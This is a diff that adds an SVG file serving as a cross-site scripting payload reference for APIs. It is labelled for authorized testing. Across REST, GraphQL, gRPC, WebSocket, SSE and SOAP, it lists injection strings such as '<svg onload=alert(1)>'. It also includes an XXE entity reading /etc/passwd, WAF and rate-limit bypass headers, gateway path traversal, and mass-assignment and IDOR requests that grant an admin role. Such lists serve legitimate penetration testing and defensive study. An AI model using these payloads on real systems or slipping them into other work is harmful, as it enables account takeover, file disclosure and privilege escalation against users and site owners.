@@ -1,0 +1,319 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  API / GraphQL / REST / gRPC SVG XSS Vectors
+  For authorized security testing only
+-->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 800 800">
+  <title>API/GraphQL/REST SVG XSS Vectors</title>
+
+  <defs>
+    <style><![CDATA[
+      .api { fill: #006d77; }
+      .vector { fill: #fab005; }
+      .text { font-family: monospace; font-size: 9px; fill: #f8f9fa; }
+      .title { font-size: 12px; fill: #fff; font-weight: bold; }
+      .endpoint { fill: #83c5be; font-family: monospace; }
+    ]]></style>
+  </defs>
+
+  <!-- =====================================================================
+       REST API - FILE UPLOAD
+       ===================================================================== -->
+  <g transform="translate(10, 10)">
+    <rect class="api" width="380" height="180" rx="5"/>
+    <text class="title" x="10" y="25">📤 REST API - FILE UPLOAD</text>
+
+    <text class="text" x="10" y="45">Multipart Form Upload:</text>
+    <text class="text" x="10" y="60" font-size="8">POST /api/upload</text>
+    <text class="text" x="10" y="75" font-size="8">Content-Type: multipart/form-data</text>
+    <text class="text" x="10" y="90" font-size="8">file=@xss.svg;type=image/svg+xml</text>
+
+    <text class="text" x="10" y="110">Base64 JSON Upload:</text>
+    <text class="text" x="10" y="125" font-size="8">POST /api/upload</text>
+    <text class="text" x="10" y="140" font-size="8">{'file': 'data:image/svg+xml;base64,PHN2Zy...'}</text>
+
+    <text class="text" x="10" y="160">URL Parameter:</text>
+    <text class="text" x="10" y="175" font-size="8">POST /api/avatar?url=data:image/svg+xml,<svg onload=alert(1)></text>
+
+    <!-- Test vector -->
+    <foreignObject x="200" y="40" width="170" height="130">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('REST Upload XSS Vectors:');
+          console.log('1. multipart/form-data with .svg');
+          console.log('2. Base64 in JSON body');
+          console.log('3. URL parameter with data: URI');
+          console.log('4. Remote URL fetch (SSRF)');
+          console.log('5. Chunked upload bypass');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       REST API - REFLECTED XSS
+       ===================================================================== -->
+  <g transform="translate(410, 10)">
+    <rect class="api" width="380" height="180" rx="5"/>
+    <text class="title" x="10" y="25">🔄 REST API - REFLECTED XSS</text>
+
+    <text class="text" x="10" y="45">Query Parameter Reflection:</text>
+    <text class="text" x="10" y="60" font-size="8">GET /api/search?q=<svg onload=alert(1)></text>
+    <text class="text" x="10" y="75" font-size="8">GET /api/users?id=<svg onload=alert(1)></text>
+
+    <text class="text" x="10" y="95">Header Reflection:</text>
+    <text class="text" x="10" y="110" font-size="8">User-Agent: <svg onload=alert(1)></text>
+    <text class="text" x="10" y="125" font-size="8">Referer: https://evil.com/<svg onload=alert(1)></text>
+    <text class="text" x="10" y="140" font-size="8">X-Forwarded-For: <svg onload=alert(1)></text>
+
+    <text class="text" x="10" y="160">Error Message Reflection:</text>
+    <text class="text" x="10" y="175" font-size="8">POST /api/validate {invalid: '<svg onload=alert(1)>'}</text>
+
+    <foreignObject x="200" y="40" width="170" height="130">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('REST Reflected XSS Vectors:');
+          console.log('1. Query params reflected in JSON');
+          console.log('2. Headers reflected in error pages');
+          console.log('3. POST body in validation errors');
+          console.log('4. Path parameters in 404 pages');
+          console.log('5. Callback parameter in JSONP');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       GRAPHQL
+       ===================================================================== -->
+  <g transform="translate(10, 210)">
+    <rect class="api" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">📊 GRAPHQL SVG XSS</text>
+
+    <text class="text" x="10" y="45">Mutation Input Injection:</text>
+    <text class="text" x="10" y="60" font-size="8">mutation { updateProfile(bio: "<svg onload=alert(1)>") { id } }</text>
+
+    <text class="text" x="10" y="80">Variable Injection:</text>
+    <text class="text" x="10" y="95" font-size="8">{"query": "mutation($bio: String!) { updateProfile(bio: $bio) }", "variables": {"bio": "<svg onload=alert(1)>"}}</text>
+
+    <text class="text" x="10" y="115">Introspection Bypass:</text>
+    <text class="text" x="10" y="130" font-size="8">{__schema { types { name fields { name } } }}</text>
+
+    <text class="text" x="10" y="150">Batch Query (Multiple):</text>
+    <text class="text" x="10" y="165" font-size="8">[{query: "mutation { a(bio: '<svg onload=1>') }"}, {query: "mutation { c(bio: '<svg onload=2>') }}]</text>
+
+    <text class="text" x="10" y="185">File Upload (GraphQL Multipart):</text>
+    <text class="text" x="10" y="200" font-size="8">operations: {mutation: "upload(file: $f)", variables: {f: null}} map: {f: ["variables.file"]}</text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('GraphQL SVG XSS Vectors:');
+          console.log('1. Mutation string input');
+          console.log('2. Variables JSON injection');
+          console.log('3. Introspection for schema');
+          console.log('4. Batch queries for mass XSS');
+          console.log('5. Multipart file upload');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       gRPC / PROTOBUF
+       ===================================================================== -->
+  <g transform="translate(410, 210)">
+    <rect class="api" width="380" height="220" rx="5"/>
+    <text class="title" x="10" y="25">⚡ gRPC / PROTOBUF</text>
+
+    <text class="text" x="10" y="45">Protobuf String Field:</text>
+    <text class="text" x="10" y="60" font-size="8">message Profile { string bio = 1; }</text>
+    <text class="text" x="10" y="75" font-size="8">bio: "<svg onload=alert(1)>"</text>
+
+    <text class="text" x="10" y="95">gRPC-Web / ConnectRPC:</text>
+    <text class="text" x="10" y="110" font-size="8">Browser-compatible gRPC with JSON/Protobuf</text>
+
+    <text class="text" x="10" y="130">Unary / Server Streaming:</text>
+    <text class="text" x="10" y="145" font-size="8">rpc GetProfile(ProfileRequest) returns (Profile)</text>
+
+    <text class="text" x="10" y="165">Client Streaming:</text>
+    <text class="text" x="10" y="180" font-size="8">rpc UploadProfile(stream Profile) returns (Status)</text>
+
+    <text class="text" x="10" y="200">Bidirectional Streaming:</text>
+    <text class="text" x="10" y="215" font-size="8">rpc Chat(stream Message) returns (stream Message)</text>
+
+    <foreignObject x="200" y="40" width="170" height="170">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('gRPC/Protobuf SVG XSS:');
+          console.log('1. String fields in proto messages');
+          console.log('2. gRPC-Web for browser access');
+          console.log('3. Streaming for payload delivery');
+          console.log('4. Reflection service enumeration');
+          console.log('5. grpcurl for testing');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       WEBSOCKET / SSE
+       ===================================================================== -->
+  <g transform="translate(10, 450)">
+    <rect class="api" width="380" height="180" rx="5"/>
+    <text class="title" x="10" y="25">🔌 WEBSOCKET / SSE</text>
+
+    <text class="text" x="10" y="45">WebSocket Message Injection:</text>
+    <text class="text" x="10" y="60" font-size="8">ws.send(JSON.stringify({type: 'chat', msg: '<svg onload=alert(1)>'}))</text>
+
+    <text class="text" x="10" y="80">SSE (Server-Sent Events):</text>
+    <text class="text" x="10" y="95" font-size="8">data: <svg onload=alert(1)>\n\n</text>
+
+    <text class="text" x="10" y="115">Socket.io / Engine.io:</text>
+    <text class="text" x="10" y="130" font-size="8">socket.emit('message', '<svg onload=alert(1)>')</text>
+
+    <text class="text" x="10" y="150">Binary WebSocket:</text>
+    <text class="text" x="10" y="165" font-size="8">ws.send(new Blob(['<svg onload=alert(1)>'], {type: 'image/svg+xml'}))</text>
+
+    <foreignObject x="200" y="40" width="170" height="130">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('WebSocket/SSE SVG XSS:');
+          console.log('1. JSON message payload');
+          console.log('2. SSE data field injection');
+          console.log('3. Socket.io event injection');
+          console.log('4. Binary blob SVG');
+          console.log('5. Reconnection exploitation');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       SOAP / XML-RPC
+       ===================================================================== -->
+  <g transform="translate(410, 450)">
+    <rect class="api" width="380" height="180" rx="5"/>
+    <text class="title" x="10" y="25">📋 SOAP / XML-RPC</text>
+
+    <text class="text" x="10" y="45">SOAP Body Injection:</text>
+    <text class="text" x="10" y="60" font-size="8"><soap:Body><UpdateProfile><bio><svg onload=alert(1)></bio></UpdateProfile></soap:Body></text>
+
+    <text class="text" x="10" y="80">XXE via SOAP:</text>
+    <text class="text" x="10" y="95" font-size="8"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><bio>&xxe;</bio></text>
+
+    <text class="text" x="10" y="115">XML-RPC:</text>
+    <text class="text" x="10" y="130" font-size="8"><methodCall><methodName>updateProfile</methodName><params><param><value><string><svg onload=alert(1)></string></value></param></params></methodCall></text>
+
+    <text class="text" x="10" y="150">WS-Security / SAML:</text>
+    <text class="text" x="10" y="165" font-size="8"><wsse:Security><saml:Assertion><svg onload=alert(1)></saml:Assertion></wsse:Security></text>
+
+    <foreignObject x="200" y="40" width="170" height="130">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('SOAP/XML-RPC SVG XSS:');
+          console.log('1. SOAP body string fields');
+          console.log('2. XXE + SVG combination');
+          console.log('3. XML-RPC string params');
+          console.log('4. SAML assertion injection');
+          console.log('5. WSDL enumeration');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       API GATEWAY / PROXY
+       ===================================================================== -->
+  <g transform="translate(10, 650)">
+    <rect class="api" width="380" height="120" rx="5"/>
+    <text class="title" x="10" y="25">🚪 API GATEWAY / PROXY BYPASSES</text>
+
+    <text class="text" x="10" y="45">Path Traversal in Route:</text>
+    <text class="text" x="10" y="60" font-size="8">/api/../admin/upload → /api/upload</text>
+
+    <text class="text" x="10" y="80">Header Injection:</text>
+    <text class="text" x="10" y="95" font-size="8">X-Original-URL: /api/upload\nX-Rewrite-URL: /api/upload</text>
+
+    <text class="text" x="10" y="115">Method Override:</text>
+    <text class="text" x="10" y="130" font-size="8">POST /api/data?_method=PUT with SVG</text>
+
+    <foreignObject x="200" y="40" width="170" height="70">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('API Gateway Bypasses:');
+          console.log('1. Path normalization issues');
+          console.log('2. Header-based routing');
+          console.log('3. HTTP method override');
+          console.log('4. Version header bypass');
+          console.log('5. Host header injection');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       RATE LIMIT / WAF BYPASS
+       ===================================================================== -->
+  <g transform="translate(410, 650)">
+    <rect class="api" width="380" height="120" rx="5"/>
+    <text class="title" x="10" y="25">🛡️ RATE LIMIT / WAF BYPASS</text>
+
+    <text class="text" x="10" y="45">IP Rotation:</text>
+    <text class="text" x="10" y="60" font-size="8">X-Forwarded-For: 1.2.3.4, 5.6.7.8 (per request)</text>
+
+    <text class="text" x="10" y="80">Parameter Pollution:</text>
+    <text class="text" x="10" y="95" font-size="8">?file=xss.svg&file=legit.png (last wins / first wins)</text>
+
+    <text class="text" x="10" y="115">Encoding Layers:</text>
+    <text class="text" x="10" y="130" font-size="8">double URL encode + base64 + unicode</text>
+
+    <foreignObject x="200" y="40" width="170" height="70">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Rate Limit/WAF Bypass:');
+          console.log('1. X-Forwarded-For rotation');
+          console.log('2. HTTP Parameter Pollution');
+          console.log('3. Multi-layer encoding');
+          console.log('4. Case variation');
+          console.log('5. Chunked transfer');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- =====================================================================
+       MASS ASSIGNMENT / IDOR
+       ===================================================================== -->
+  <g transform="translate(10, 790)">
+    <rect class="api" width="780" height="120" rx="5"/>
+    <text class="title" x="10" y="25">🎯 MASS ASSIGNMENT / IDOR WITH SVG XSS</text>
+
+    <text class="text" x="10" y="45">Mass Assignment:</text>
+    <text class="text" x="10" y="60" font-size="8">POST /api/users/1 {bio: '<svg onload=alert(1)>', role: 'admin', isActive: true}</text>
+
+    <text class="text" x="10" y="80">IDOR (Insecure Direct Object Reference):</text>
+    <text class="text" x="10" y="95" font-size="8">PUT /api/profiles/1337 {avatar: '<svg onload=alert(1)>'} → affects user 1337</text>
+
+    <text class="text" x="10" y="115">BULK Operations:</text>
+    <text class="text" x="10" y="130" font-size="8">POST /api/bulk/update [{id: 1, bio: '<svg onload=1>'}, {id: 2, bio: '<svg onload=2>'}]</text>
+
+    <foreignObject x="550" y="40" width="220" height="70">
+      <body xmlns="http://www.w3.org/1999/xhtml">
+        <script>
+          console.log('Mass Assignment/IDOR SVG XSS:');
+          console.log('1. Extra fields in update');
+          console.log('2. IDOR on profile endpoints');
+          console.log('3. Bulk update for mass XSS');
+          console.log('4. Hidden API parameters');
+          console.log('5. Nested object injection');
+        </script>
+      </body>
+    </foreignObject>
+  </g>
+
+  <!-- Footer -->
+  <text class="text" x="10" y="915" font-size="10">
+    API/GraphQL/REST SVG XSS Vectors | Test all input vectors | Authorized Testing Only
+  </text>
+</svg>
